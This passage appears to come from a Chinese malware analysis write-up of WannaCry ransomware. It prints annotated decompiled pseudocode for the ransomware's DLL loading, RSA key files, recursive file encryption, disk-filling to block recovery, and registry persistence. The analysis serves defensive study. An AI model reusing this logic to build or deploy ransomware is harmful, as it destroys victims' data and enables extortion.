if ( dwSize != (v17 & (v27 + v28 - 1)) )      // 此处条件不成立 跳过if分支  

{  

LABEL_3:  

SetLastError(0xC1u);  

return 0;  

}  

pAllocAddress = ((int (__cdecl *)(_DWORD, int, signed int, MACRO_PAGE, int))VirtualAlloc_Addr)(  

*((_DWORD *)NtHeader + 13),  

dwSize,  

0x3000,  

PAGE_READWRITE,  

a8);       
// 申请一块大小为0x10000的可读可写的内存空间  

if ( !pAllocAddress )  

{  

pAllocAddress = ((int (__cdecl *)(_DWORD, int, signed int, MACRO_PAGE, int))VirtualAlloc_Addr)(  

0,  

dwSize,  

0x3000,  

PAGE_READWRITE,  

a8);                      // 如果申请失败则再次申请  

if ( !pAllocAddress )  

{  

LABEL_24:  

SetLastError(0xEu);  

return 0;  

}  

}  

hHeap = GetProcessHeap();                     // 获取进程的堆句柄  

pHeapAddress = (unsigned int)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x3Cu);  

pHeapBase = (int *)pHeapAddress;  

if ( !pHeapAddress )  

{  

((void (__cdecl *)(int, _DWORD, signed int, int))VirtualFree_Addr)(pAllocAddress, 0, 0x8000, a8);  

goto LABEL_24;  

}  

*(_DWORD *)(pHeapAddress + 4) = pAllocAddress;  

LOWORD(pHeapAddress) = *((_WORD *)NtHeader + 11);  

pHeapBase[5] = (pHeapAddress >> 13) & 1;  

pHeapBase[7] = VirtualAlloc_Addr;  

pHeapBase[8] = VirtualFree_Addr;  

pHeapBase[9] = LoadLibraryA_Addr;  

pHeapBase[10] = GetProcAddress_Addr;  

pHeapBase[11] = FreeLibrary_Addr;  

pHeapBase[12] = a8;  

pHeapBase[14] = v27;  

if ( !CmpFileSize(FileSize, *((_DWORD *)NtHeader + 0x15))

// 比较文件大小是否大于等于SizeOfHeaders  0x1000  

|| (AllocAddr = (char *)((int (__cdecl *)(int, _DWORD, signed int, signed int, int))VirtualAlloc_Addr)(  

pAllocAddress,  

*((_DWORD *)NtHeader + 21),  

0x1000,  

4,  

a8), 
// 申请一块大小为0x1000的可读可写的内存  0x1000是SizeOfHeaders  

memcpy(AllocAddr, pFileBase,
*((_DWORD *)NtHeader + 21)),

// 把PE头拷贝到申请的堆空间  

NtHeaderBaseAddr = (int)&AllocAddr[*((_DWORD *)pFileBase + 0xF)],  

*pHeapBase = NtHeaderBaseAddr,  

*(_DWORD *)(NtHeaderBaseAddr + 52) = pAllocAddress,  

!sub_402470((int)pFileBase, FileSize, (int)NtHeader, (int)pHeapBase))  

|| (*(_DWORD *)(*pHeapBase + 52) == *((_DWORD *)NtHeader + 13) ? (pHeapBase[6] = 1) : (pHeapBase[6] = sub_402758(pHeapBase, *(_DWORD *)(*pHeapBase + 52) - *((_DWORD *)NtHeader + 13))),  

!sub_4027DF(pHeapBase) || !sub_40254B(pHeapBase) || !sub_40271D(pHeapBase)) )  

{  

LABEL_37:  

sub_4029CC(pHeapBase);  

return 0;  

}  

v24 = *(_DWORD *)(*pHeapBase + 40);  

if ( v24 )  

{  

if ( pHeapBase[5] )  

{  

if ( !((int (__stdcall *)(int, signed int, _DWORD))(pAllocAddress + v24))(pAllocAddress, 1, 0) )  

{  

SetLastError(0x45Au);  

goto LABEL_37;  

}  

pHeapBase[4] = 1;  

}  

else  

{  

pHeapBase[13] = pAllocAddress + v24;  

}  

}  

else  

{  

pHeapBase[13] = 0;  

}  

return pHeapBase;  

}  
```

该函数申请了一块堆空间 并将去掉了解密出的PE文件的DOS头并拷贝到了堆空间中

### 5.3.6 GetExportFunAddr 获取导出函数地址

```c
AllocBase = (_DWORD )(pHeapBase + 4);  // AllocBase=0x10000000 是申请的空间的基址  

DataDirectory = (int)((_DWORD )pHeapBase + 0x78);// pe头+0x78=数据目录表  

AllocBase_2 = (_DWORD )(pHeapBase + 4);  

if ( !(_DWORD )((_DWORD )pHeapBase + 0x7C) )  

goto LABEL_12;  

ExportRVA = DataDirectory;                   // 取出数据目录表的第一项->导出表的RVA  

NumberOfNames = (_DWORD )(DataDirectory + AllocBase + 0x18);// 取出以名称方式导出的函数数量  

ExportVA = (_DWORD )(AllocBase + ExportRVA); // 基址+导出表的RVA=导出表的VA  
```

该函数有两个参数 堆空间的首地址 和TaskStart这个字符串
并返回了导出函数地址

对于函数逻辑：这个函数首先取出了数据目录表，并根据数据目录表找到了导出表，接着我们看一下dll文件的导出表：

{% asset_img image18.png 18 %}

图十六：t_wnry.dll 导出表

得知TaskStart就是传进去的第二个参数

## 5.4 小结

1.  获取必要的API函数地址

2.  导入私钥并申请空间

3.  用导入的私钥解密出一个dll

4.  申请一块堆空间 将dll写入到堆内存里

5.  在堆内存中找到dll的导出函数地址 并调用

从上面的分析可以得出病毒的主体程序实际上只做了一些初始化的操作
到目前为止并没有看到它感染或加密任何一个文件 也没有对用户进行勒索
真正的核心代码在t.wnry中 由于这个函数是在堆空间中调用
所以在IDA中并没有显示出伪C代码 那么接下来需要分析刚刚提取出来的dll

## 5.5 加载病毒核心操作

在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析

### 5.3.1 GetApis 获取必要的API函数 

# 6 t.wnry.dll 病毒核心部分分析 

## 6.1 主体逻辑

t.wnry.dll
作为病毒的核心部分，包括了病毒所有的危害操作，包括加密解密文件，勒索用户等有害操作，下面我将为大家一步步的进行分析：

### 6.1.1 TaskStart 病毒的逻辑主体函数 

```c
int __stdcall TaskStart(HMODULE hModule, int a2) {

if ( a2 || RunSingle() )                      // 互斥体防双开  

return 0;  

Filename = word_1000D918;                     // 初始化缓冲区  

memset(&v12, 0, 0x204u);  

v13 = 0;  

GetModuleFileNameW(hModule, &Filename, 0x103u);// 获取当前进程的完整路径  

if ( wcsrchr(&Filename, '') )  *wcsrchr(&Filename, '') = 0;              // 获取到字符串->.wcry.exe   

SetCurrentDirectoryW(&Filename);  

if ( !ReadFileToMem(&c_wnryBase, 1) )         // 读取c.wnry到内存  

return 0;  

StartIsSuccess = GetUsersidAndCmp();       // 获取当前用户的SID并与系统的SID作比较  

if ( !GetApis() )                             // 获取必要的API函数地址  

return 0;  

sprintf(FileName_0, a08xRes, 0);              // Dest=00000000.res  

sprintf(FileName, a08xPky, 0);                // FileName=00000000.pky  

sprintf(buff, a08xEky, 0);                    // buff=00000000.eky  

if ( SetAccessControl(0) || sub_10004500(0) ) 

// 1.设置访问控制属性 2.判断是否存在00000000.pky这个文件 由于不存在 直接return  

{  

hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartExeAndSetReg,0, 0, 0);

// 条件不成立 跳过这个if分支 隐藏分支待分析  

WaitForSingleObject(hThread, 0xFFFFFFFF);  

CloseHandle(hThread);  

return 0;  

}  

lpAddress = (char)operator new(0x28u);      // 申请一块内存空间  

v14 = 0;  

if ( lpAddress )  

v3 = InitializeCriSection(lpAddress);       // 初始化临界区  

else

v3 = 0;  

v14 = -1;  

if ( !v3 || !CreatePkyAndEky(v3, FileName, buff) )

// 创建00000000.pky和00000000.eky 一个是公钥 一个是加密后的私钥  

return 0;  

if ( !OpenResFile() || dword_1000DC70 ) // 打开00000000.res文件 

{  

DeleteFileA(FileName_0);  

memset(&RandomBytes, 0, 0x88u);  

dword_1000DC70 = 0;  

GetRandom((HCRYPTPROV)v3, &RandomBytes, 8u);// 获取0x8个字节的随机数  

}  

DestoryHandle(v3);  

((void (__thiscall )(char , signed int))v3)(v3, 1);//隐藏函数 用于释放临界区  

hThread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CreateResFile, 0, 0, 0);

// 创建00000000.res文件  

if ( hThread_1 )  

CloseHandle(hThread_1);  

Sleep(100u);  

hThread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckDky, 0, 0, 0);

// 每隔五秒检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return  

if ( hThread_2 )  

CloseHandle(hThread_2);  

Sleep(100u);  

hThread_3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptAllFiles, 0, 0, 0);

// 加密所有文件  

Sleep(100u);  

hThread_4 = CreateThread(0, 0, StartTaskdl, 0, 0, 0);

// 每隔三秒以隐藏的方式启动taskdl.exe  

if ( hThread_4 )  

CloseHandle(hThread_4);  

Sleep(100u);  

hThread_5 = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)StartExeAndSetReg, 0, 0, 0);

// 每隔三秒 启动taskse.exe和@WanaDecryptor@.exe并且修改注册表  

if ( hThread_5 )  

CloseHandle(hThread_5);  

Sleep(100u);  

RepeatOperation(); // 创建批处理脚本
加密器 Read_Me@.txt 加密其他用户下的文件 

if ( hThread_3 )  

{  

WaitForSingleObject(hThread_3, INFINITE);  

CloseHandle(hThread_3);  

}  

return 0;  

}  
```

Dll 文件主题包括了病毒的所有操作：

1.  初始 临界区，缓冲区，路径，字符串并将c.wnry读到内存

2.  建立 公钥，私钥文件，并加密所有文件

3.  每隔三秒 隐藏方式启动 taskdl.exe taskse.exe 等文件

4.  创建批处理脚本 加密器 Read_Me@.txt 加密其他用户下的文件

### 6.1.2 GetUsersidAndCmp 获取当前用户SID并与系统的SID作比较

```c
memset(&v4, 0, 0x254u);                 // 将buff缓冲区清零  

if ( GetCurrentUserSID(&Buffer) )        // 获取当前用户的SID  
{  
v0 = wcsicmp(aS1518, &Buffer);         // 比较当前的SID是否是S-1-5-18->系统的SID  
}  
```

从注册表中获取到当前用户的SID并于系统的SID做比较

### 6.1.3 CreatePkyAndEky 创建 pky 和 eky 文件

```c
if ( !GetCSPHandle((char) this) )            // 获取CSP服务程序句柄  

{  

DestoryHandle(v3);                          // 如果失败则释放资源  
return 0;  

}  

if ( lpFileName )  

{  

if ( !ImportPubKey(v3, lpFileName) )        // 当00000000.pky不存在时 条件成立  

{  

if ( !CryptImportKey_Addr(v3[1], &pbData, 0x114, 0, 0, v3 + 3)// 导入RSA公钥  
|| !CryptGenKey(v3[1], (int)(v3 + 2))   // 生成可导出的2048位RSA签名密钥  
|| !CreatePkyFile(v3[1], v3[2], 6u, lpFileName) )// 创建00000000.pky文件 并写入生成的RSA公钥  

{  

goto LABEL_19;  

}  

if ( pky_str )  

CreateEkyFile((int)v3, pky_str);        // 创建00000000.eky文件 并写入加密后的RSA私钥  

if ( !ImportPubKey(v3, lpFileName) )      // 导入00000000.pky的公钥  

{  

BEL_19:  

DestoryHandle(v3);                      // 如果导入失败释放句柄  

return 0;  

}  

}  

v5 = v3[3];                                 // 当00000000.pky存在时 直接退出函数  
```

这个函数在当前路径里创建 pky 和 eky文件， pky为公钥，eky为加密后的私钥

### 6.1.4 CreateResFile 线程回调+创建 res 文件

```c
void __stdcall __noreturn CreateResFile(LPVOID lpThreadParameter)  

{  

signed int index; // esi  



while ( !dword_1000DD90 )  
{  

SystemTime = time(0);                       // 返回当前系统时间  

CreateRes();                                // 创建并写入00000000.res文件  

index = 0;  

do                                         // 休眠22秒  
{  
if ( dword_1000DD90 )  
goto LABEL_6;  
Sleep(1000u);  
++index;  
}  

while ( index < 0x19 );  
}  

LABEL_6:  
ExitThread(0);                                // 退出线程  

} 
```

在当前工作路径创建了 res 文件，并往里写数据：

写入了 0x8个字节的随机数 和 0x4 个字节的当前时间

### 6.1.5 CheckDky 线程回调+检测文件存在与否

```c
void __stdcall __noreturn CheckDky(LPVOID lpThreadParameter)  

{  

while ( 1 )  

{  

dword_1000DD8C = sub_10004500((int)lpThreadParameter);
    // 检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return  

if ( dword_1000DD8C )  

break;  

Sleep(5000u);  

}  

ExitThread(0);  

}  
```

每隔5秒检测时候存在 dky 文件，存在就 引入 公钥并 进行 加解密操作

## 6.2 EncrypteAllFiles 线程回调+加密 (Important)

> 作为病毒的核心函数嵌套了，里外嵌套了很多层

### 6.2.1 第一层

```c
Drives = GetLogicalDrives();                  // 获取驱动中所有磁盘  

if ( !dword_1000DD8C )  

{  

while ( 1 )  

{  

Sleep(3000u);  

Drives_1 = Drives;  

Drives = GetLogicalDrives();  

if ( Drives != Drives_1 )                 // 检测是否有新的磁盘加入  
```

循环检测是否有新的磁盘加入，有就加密，没有就一直循环

### 6.2.2 第二层

```c
DWORD __stdcall sub_10005680(LPVOID Num_3)  

{  

char Parameter; // [esp+0h] [ebp-930h]  

int v3; // [esp+92Ch] [ebp-4h]  



InitCritical(&Parameter);                     // 初始化临界区  

v3 = 0;  

if ( MovFileToTemp(&Parameter, FileName, (int)sub_10005340, (int)&dword_1000DD8C) )// 移动文件到临时目录下并重命名为.WNCRTY  

{  

EncryptFile((int)&Parameter, (LONG)Num_3, 0);// 加密磁盘上的所有文件   

FillDisk((int)Num_3);                       // 在回收站创建一个文件 并且循环写入数据直到磁盘空间不足  

ReleaseResouce(&Parameter);                 // 释放资源  

ExitThread(0);  

}  

v3 = -1;  

DeleteCritical(&Parameter);                   // 释放临界区  

return 0;  

}  
```



> 第二层中有三个比较重要的函数，起到了防止恢复软件对删除文件进行恢复等作用

#### 6.2.2.1 MoveFileToTemp 移动文件并重命名

```c
result = (HGLOBAL)CreatePkyAndEky((_DWORD *)lpParameter + 1, lpFileName, 0);

// 创建00000000.pky和00000000.eky文件 此时文件已存在 直接退出函数  

if ( result )  

{  

if ( lpFileName )                           // lpFileName=00000000.pky  

CreatePkyAndEky((_DWORD *)v4 + 11, 0, 0); // 再一次检测是否存在这两个文件  

result = GlobalAlloc(0, 0x100000u);         // 申请0x10000大小的空间  

*((_DWORD *)v4 + 0x132) = result;  

if ( result )  

{  

result = GlobalAlloc(0, 0x100000u);       // 再次申请0x10000大小的空间  

*((_DWORD *)v4 + 0x133) = result;  

if ( result )  

{  

InitializeCriticalSection((LPCRITICAL_SECTION)(v4 + 1260));  

*((_DWORD *)v4 + 310) = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v4, 0, 0);
// 将文件移动到临时目录下并重命名为WNCRTY  
```

该函数单独创建了一个线程 将一部分文本文件移动到临时目录并重命名

值得注意的是，这时文件并没有进行加密，是可以直接通过修改后缀名修复的

#### 6.2.2.2 FillDisk 回收站循环写入

```c
void *__cdecl FillDisk(int Num_3)  {  

hGlobal = (void *)GetDriveTypeW(RootPathName);// 获取磁盘类型  

if ( hGlobal == (void *)DRIVE_FIXED )         // 如果是固定磁盘  

{  

hGlobal = GlobalAlloc(0, 0xA00000u);        // 申请0xA00000大小的固定空间  

hGlobal_1 = hGlobal;  

if ( hGlobal )  

{  

memset(hGlobal, 0x55u, 0xA00000u);        // 将申请的空间全部初始化为5  

FileName = 0;  

memset(&v12, 0, 0x204u);  

v13 = 0;  

DeleteRecycleFile(Num_3, &FileName);      // 删除$RECYCLE的hibsys.WNCRYT文件  

hFile = CreateFileW(&FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);// 在$RECYCLE下创建一个hibsys.WNCRYT 属性为隐藏  

if ( hFile == (HANDLE)-1 )  

{  

hGlobal = GlobalFree(hGlobal_1);        // 创建失败直接释放空间  

}  

else  

{  

MoveFileExW(&FileName, 0, MOVEFILE_DELAY_UNTIL_REBOOT);// 在系统下次重新启动时正式进行移动文件操作  

if ( !dword_1000DD8C )  

{  

LABEL_6:  

if ( GetDiskFreeSpaceExW(             // 获取D盘的剩余空间的大小 确保空间足够  

RootPathName,  

&FreeBytesAvailableToCaller,  

&TotalNumberOfBytes,  

&TotalNumberOfFreeBytes)  

&& TotalNumberOfFreeBytes.QuadPart > 0x40000000 )  

{  

index = 0;  

while ( WriteFile(hFile, hGlobal_1, 0xA00000u, &NumberOfBytesWritten, 0) )// 将0xA00000个字节的5写入到hibsys.WNCRYT  

{  

Sleep(0xAu);  

if ( (unsigned int)++index >= 20 )// 循环写入20次  

{  

Sleep(10000u);  

if ( !dword_1000DD8C )  

goto LABEL_6;                 // 当磁盘剩余空间不足时跳出循环  

break;  

}  

}  

}  

}  

GlobalFree(hGlobal_1);                  // 释放申请的内存  

FlushFileBuffers(hFile);                // 刷新文件缓冲区  

CloseHandle(hFile);  

hGlobal = (void *)DeleteFileW(&FileName);// 删除临时目录文件夹下的hibsys.WNCRYT  

}  

}  

}  

return hGlobal;  

} 
```

这个函数 会在 $RECYCLE 下创建一个名为 hibsys.WNCRYT 的文件
并设置属性为隐藏，并循环往这个文件写入数据，知道磁盘空间不足

在我们的测试环境下，这个文件已经达到了 39个G

{% asset_img image19.png 19 %}

#### 6.2.2.3 EncryptFile 加密磁盘上的所有文件

```c
if ( a3 )                                     // 条件不成立  

{  

uDriveType = GetDriveTypeW;                 // 获取磁盘类型  

if ( GetDriveTypeW(DirectoryName) == DRIVE_CDROM )// 如果是CD驱动器直接返回  

return;  

InterlockedExchange(&Target, Value);        // 交换两个数  

goto LABEL_12;  

}  

if ( InterlockedExchangeAdd(&Target, 0) != Value )// 用于对一个32位数值执行加法的原子操作  

{  

v3 = 0;  

while ( !GetDiskFreeSpaceExW(               // 获取D盘的空余容量 如果失败直接返回  

DirectoryName,  

&FreeBytesAvailableToCaller,  

&TotalNumberOfBytes,  

&TotalNumberOfFreeBytes)  

|| !TotalNumberOfBytes.QuadPart )  

{  

Sleep(1000u);  

if ( ++v3 >= 30 )  

return;  

}  

uDriveType = GetDriveTypeW;  

if ( GetDriveTypeW(DirectoryName) != DRIVE_CDROM )// 获取磁盘类型  

{  

LABEL_12:  

if ( uDriveType(DirectoryName) == DRIVE_FIXED )// 如果磁盘类型是固定磁盘  

{  

lpPath = 0;  

memset(&v11, 0, 0x204u);  

v12 = 0;  

GetRecyclePathOrTempPath(Value, &lpPath);// 获取C盘下临时文件和回收站路径  

GetFilePath((wchar_t *)Path, &lpPath);  //获取文件路径D:$RECYCLE0.WNCRYT  

}  

LOWORD(v6) = 0;  

CoreEncryptFun((const wchar_t *)Path, DirectoryName, 1);// 核心函数 加密操作  
```

该函数主体仍是加密文件之前的预处理部分，涉及具体的加密过程要进入
CoreEncryptFun 函数进行分析。

### 6.2.3 第三层

TraverseAndEncryptFiles(v3, DirectoryName, (int)&v15, -1, a3);// 遍历所有文件 并且加密 

第三层主要就是递归调用这个加密函数并对所有要加密文件进行遍历，下面我们继续深入

### 6.2.4 第四层

```c
FileKind = FilterPostFix(FindFileData.cFileName);// 对后缀进行过滤 返回值为1说明是exe或dll 2说明是文本文件或者图片  

v48 = FileKind;  

if ( FileKind != (wchar_t *)6   // 如果后缀为.WNCRY直接跳过  

&& FileKind != (wchar_t *)1   // 如果是exe和dll直接跳过遍历下一个文件  

&& (FileKind || FindFileData.nFileSizeHigh > 0 || FindFileData.nFileSizeLow >= 0xC800000) )  

{  

wcsncpy(&TaegetFileName, FindFileData.cFileName, 0x103u);// 将文件名拷贝到目标内存  

wcsncpy(&TargetFileFullPath, &String, 0x167u);// 将完整路径拷贝到目标内存  

dwFileSizeHigh = FindFileData.nFileSizeHigh;  

dwFileSizeLow = FindFileData.nFileSizeLow;  

sub_10003760(&v32, &v36, v33, &TargetFileFullPath);// 这个函数会操作容器将容器的计数+1  

}  

}  

}  

}  

}  

}  

hFile = hFindFile;  

}  

while ( FindNextFileW(hFindFile, &FindFileData) );// 查找下一个文件  

FindClose(hFile);  

for ( i = *(wchar_t )v33; i != v33; i = *(wchar_t )i )// 循环加密所有的文件  

{  

if ( !EncryptAllFile(v5, i + 4, 1) )      // 加密所有文件  

sub_10003760((_DWORD *)a3, &v36, *(_DWORD )(a3 + 4), i + 4);  

}  

v14 = a4;  

if ( a4 == -1 )  

{  

v15 = Format;  

v14 = 0;  

if ( wcsnicmp(Format, asc_1000CC14, 2u) )  

v14 = 1;  

else  

v15 = Format + 2;  

v16 = *v15;  

for ( j = v15; v16; ++j )  

{  

if ( v16 == 92 )  

++v14;  

v16 = j[1];  

}  

}  

if ( v14 <= 6 && v34 > 0 )  

{  

CopyReadMeTxt(Format);                    // 将@Please_Read_Me@.txt 拷贝到D盘下  

if ( v14 > 4 )  

CopyWanaDecryptor_0(Format);            // 将@WanaDecryptor@.exe拷贝到D盘  

else  

CopyWanaDecryptor(Format);              // 将@WanaDecryptor@.exe拷贝到D盘  

}  

v18 = v30;  

if ( a5 )  

{  

v19 = *(_DWORD )v30;  

if ( *(void )v30 != v30 )  

{  

v20 = v14 + 1;  

do  

{  

v21 = (wchar_t *)v19[3];  

if ( !v21 )  

v21 = (wchar_t *)`std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Nullstr'::`2'::_C;  

TraverseAndEncryptFiles((_DWORD *)v35, v21, a3, v20, a5);// 递归遍历文件  

v19 = (_DWORD *)*v19;  

v18 = v30;  

}  

while ( v19 != v30 );  

}  

}  

v22 = v18;  

LOBYTE(v49) = 0;  

v23 = (_DWORD *)*v18;  

if ( (_DWORD *)*v18 != v18 )  

{  

do  

{  

v24 = v23;  

v23 = (_DWORD *)*v23;  

DeleteAllocMem(&v29, (int)&v36, v24);   // 释放所有申请的空间  
```

该函数会首先遍历所有的文件，对文件和文件夹执行不同的操作并且对后缀名进行过滤，跳过@Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk，@WanaDecryptor@.bmp总结为枚举



### 6.2.5 第五层

```c
enum FILE_TYPE  
{  
FILE_TYPE_NULL = 0,  
FILE_TYPE_EXEDLL,  
FILE_TYPE_DOC,  
FILE_TYPE_DOCEX,  
FILE_TYPE_WNCRYT, //.wncryt  
FILE_TYPE_WNCYR, //.wncyr  
FILE_TYPE_WNCRY //.wncry  
}  

int __thiscall EncryptAllFile(const wchar_t this, wchar_t TargetFileFullPath, int Num_1)  
{  

const wchar_t this_1; // edi  
int result; // eax  
this_1 = this;  

	switch ( sub_10002E70(TargetFileFullPath, Num_1) )// 根据返回值不同执行不同的操作  
	{  

	case 0:  return 1;  

	case 2:  DeleteFileW_Addr(TargetFileFullPath);  return 1;  

	case 3:  if ( EncryptFiles(this_1, TargetFileFullPath, 3) )// 加密文件 
		{  
			wcscat(TargetFileFullPath, WNCRT);  
			wcscat(TargetFileFullPath + 360, WNCRT);  
			((_DWORD)TargetFileFullPath + 312) = 5;  
		}  
		goto LABEL_5;  

	case 4:                                     // .jpg  
        EncryptFiles(this_1, TargetFileFullPath, 4);  
		result = 1;  
		break;  

	default:  

	LABEL_5:  
		result = 0;  
		break;  

		}  
	return result;  
} 
```

针对该函数的加密策略做一个总结：

1.  在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理

2.  枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件
    cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR
    cmd=2, 删除.WNCRYT

3.  cmd=3, 加密链表中所有文件（移出链表）

4.  cmd=4, 加密可能剩余链表中的文件

> 虽然操作不同 但是加密函数是同一个 接下来再次进入EncryptFiles

### 6.2.6 第六层

1.   pTargetPostFix = wcsrchr(&NewTargetFileFullPath, '.');// 获取文件后缀名  

2.    pTargetPostFix_1 = pTargetPostFix;  

3.    if ( !pTargetPostFix )  

4.    {  

5.      pTargetPostFix_2 = &NewTargetFileFullPath;  

6.      goto LABEL_6;  

7.    }  

8.    IsWNCRY = wcsicmp(pTargetPostFix, WNCRT);     // 将后缀名与WNCRY比较  

9.    pTargetPostFix_2 = pTargetPostFix_1;  

10.   if ( IsWNCRY )  

11.   {  

12. LABEL_6:  

13.     wcscat(pTargetPostFix_2, Source);           // 字符串拼接 原后缀+.WNCRY  

14.     goto LABEL_8;  

15.   }  

16.   wcscpy(pTargetPostFix_1, Source);  

17. LABEL_8:  

18.   if ( GetFileAttributesW(&NewTargetFileFullPath) != -1  

19.     || StartEncryptFiles((char *)v9, (int)OldTargetFileFullPath, &NewTargetFileFullPath, Num_4) )// 开始加密文件  

20.   {  

21.     if ( Num_4 == 4 )  

22.       sub_10002BA0(v9, OldTargetFileFullPath);  

23.     result = 1;  

24.   }  

25.   else  

26.   {  

27.     DeleteFileW_Addr(&NewTargetFileFullPath);  

28.     result = 0;  

29.   }  

30.   return result;  

31. }  

这个函数仍然是作为加密函数的准备工作，获取文件的后缀名，将后缀名和.WNCRY做比较，如果一致就不加密，然后将原后缀与.WNCRY做拼接，然后开始加密文件

### 6.2.7 第七层

1.  if ( !GetFileSizeEx(hFile_1, &FileSize) )     // 获取目标文件大小  

2.  {  

3.    local_unwind2((int)&ms_exc.registration, -1);  

4.    return 0;  

5.  }  

6.  GetFileTime(hFile_1, &CreationTime, &LastAccessTime, &LastWriteTime);// 获取文件时间  

7.  if ( ReadFile_Addr(hFile_1, &lpBuffer, 8, &lpNumberOfBytesRead, 0)// 读取0x8个字节的文件内容  

8.    && !memcmp(&lpBuffer, aWanacry, 8u)         // 将0x8个字节与WANACRY!比较  

```{=html}
<!-- -->
```
1.  读取文件前0x8个字节，与WNACRY！作比较

```{=html}
<!-- -->
```
1.  SetFilePointer(hFile, 0, 0, 0);               // 将文件指针重新设置到文件开头  

2.    if ( a4 == 4 )  

3.    {  

4.      swprintf(&String, (size_t)aSS, NewTargetFileFullPath, aT);// 拼接字符串 在原文件后加上.WNCRYT  

5.      NewhFile = (void *)CreateFileW_Addr(&String, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);// 创建文件  

2．使用源文件名 + .WNCRYT 创建一个新的空的文件

1.  if ( !EncryptDatas(v32, &pbBuffer, 0x10u, (int)&v17, (int)&v20) )// 对数据进行加密  

2.      goto LABEL_39;  

3.    sub_10005DC0(this_1 + 84, (int)&pbBuffer, (int)off_1000D8D4, 16, 16);  

4.    memset(&pbBuffer, 0, 0x10u);  

5.    if ( !WriteFile_Addr(NewhFile, aWanacry, 8, &v35, 0)// 写入到创建的文件->WANACRY!   

6.      || !WriteFile_Addr(NewhFile, &v20, 4, &v35, 0)// 写入到创建的文件->0x100  

7.      || !WriteFile_Addr(NewhFile, &v17, v20, &v35, 0)// 写入0x100个字节的加密数据到文件  

8.      || !WriteFile_Addr(NewhFile, &a4, 4, &v35, 0)// 写入0x4到文件  

9.      || !WriteFile_Addr(NewhFile, &FileSize, 8, &v35, 0) )// 写入0x081006到文件 

```{=html}
<!-- -->
```
2.  将加密后的数据写入到新创建的文件中

```{=html}
<!-- -->
```
1.  if ( !ReadFile_Addr(hFile_2, *((_DWORD *)this_1 + 306), 0x10000, &lpNumberOfBytesRead, 0)  

2.    || lpNumberOfBytesRead != 0x10000 )     // 读取目标文件  

3.  {  

4.  21:  

5.    local_unwind2((int)&ms_exc.registration, -1);  

6.    return 0;  

7.  }  

8.  sub_10006940((int)(this_1 + 84), *((_DWORD *)this_1 + 306), *((char )this_1 + 307), 0x10000u, 1);  

9.  if ( WriteFile_Addr(NewhFile, *((_DWORD *)this_1 + 307), 0x10000, &v35, 0) && v35 == 0x10000 )// 将加密后的内容写入到新文件  

```{=html}
<!-- -->
```
3.  读取源文件，并将加密后的内容写入到新创建的文件中

到此为止，加密函数的分析已经完成

## 6.3 剩余函数分析

这部分我们将对 t.wnry.dll 中剩余的函数进行逐一的分析

### 6.3.1 StartTaskdl 线程回调+隐藏启动taskdl.exe

1.  if ( !CreateProcessA(0u, lpCommandLine, 0u, 0u, 0, 0x8000000u, 0u, 0u, &StartupInfo, &ProcessInformation) )// 创建Taskdl.exe进程  

该函数每隔3秒会以隐藏的方式启动 taskdl.exe

### 6.3.2 StartExeAndSetReg 

线程回调+启动taskse.exe和@WanaDecryptor@.exe)+修改注册表

```c
ReadFileToMem(&c_wnryBase, 0);          // 读取c.wnry的内容到内存  

}  

StartTaskseAndDecryptor();                // 启动taskse.exe和@WanaDecryptor@.exe  

if ( v1 )  

{  

GetFullPathNameA(aTaskscheExe, 0x208u, &Buffer, 0);

// C:UsersDingisoDesktoptasksche.exe  

SetRegRun((int)&Buffer);                // 设置注册表启动项  
```

该函数每隔三秒启动taskse.exe 和 @WanaDecryptor@.exe 然后利用 CMD
设置注册表启动项为 tasksche.exe 的绝对地址

### 6.3.3 RepeatOperation 重复操作

```c
if ( GetFileAttributesA(aFWnry) == -1 )       // 检测f.wnry是否存在  

sub_100018F0(&Parameter, 10, 100);  

if ( !CurrentTime )  

{  

CurrentTime = time(0);  

CreateRes();                                // 写入0x8个字节到00000000.res  

sprintf(&Dest, aSFi, NewFileName);          // @WanaDecryptor@.exe fi  

StartTargetFile(&Dest, 0x186A0u, 0);  

ReadFileToMem(&c_wnryBase, 1);  

}  

RunBat();                                     // 创建并启动批处理脚本  

CreateReadMe();                               // 创建@Please_Read_Me@.txt  

EncryptOtherUsersFiles((int)&Parameter);      // 加密windows剩余所有用户的文件 
```

该函数有三个重要的函数，就不展开分析了，我在这里将把他们的逻辑表述清楚

1.  RunBat():判断@WanaDecryptor@.exe.lnk是否存在，如果不存在就创建一个批处理脚本，将命令写入.bat脚本脚本作用为给@WanaDecryptor@.exe创建快捷方式）
    
2.  CreateReadMe():检测工作路径下是否存在 ReadMe不存在就从r.wnry中读取内容并写入 ReadMe
    
3.  EncryptOtherUsersFiles():获取Windows所有的用户名，判断是否与当前的有户名相同，不同就加密该用户的所有文件

## 7 taskdle.exe 病毒辅助文件分析 

```c
dwDrives = GetLogicalDrives();                // 获取系统中所有的磁盘  

v5 = 0x19;  

do  

{  

*(_DWORD *)RootPathName = dword_403060;  

v8 = dword_403064;  

RootPathName[0] = v5 + 65;  

if ( (dwDrives >> v5) & 1 && GetDriveTypeW(RootPathName) != 4 )//获取D盘类型  

{  

DeleteFile(v5);                    // 清空回收站和临时目录所有以.WNCRYT 结尾文件  

Sleep(10u);  

}  

--v5;  

}  

while ( v5 >= 2 );  
```

taskdl 的代码量相比上面的其他文件小很多了，主要就是涉及删除文件的操作

